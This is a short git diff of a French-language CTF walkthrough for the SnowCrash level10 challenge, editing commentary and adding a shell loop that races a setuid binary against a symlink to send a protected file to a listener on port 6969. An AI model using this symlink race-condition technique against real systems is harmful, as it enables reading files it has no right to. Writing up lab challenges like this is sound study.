@@ -96,7 +96,7 @@ level10@SnowCrash:~$ man access
 ...
 ```
 
-par contre, on peut ouvrir level10
+on peut voir "security hole"!!!!!
 
 ```zsh
 level10@SnowCrash:~$ ./level10 level10 localhost
@@ -136,10 +136,10 @@ done
 
 ```zsh
 level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
+level10@SnowCrash:/tmp/link$ while true; do ./level10 /tmp/link/link localhost:6969; done
 ```
 
 ```zsh
-level10@SnowCrash:/tmp/link$ ./makeSymLink.sh
 Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
 You don't have access to /tmp/link/link
 Connecting to 192.168.56.101:6969 .. Unable to connect to host 192.168.56.101
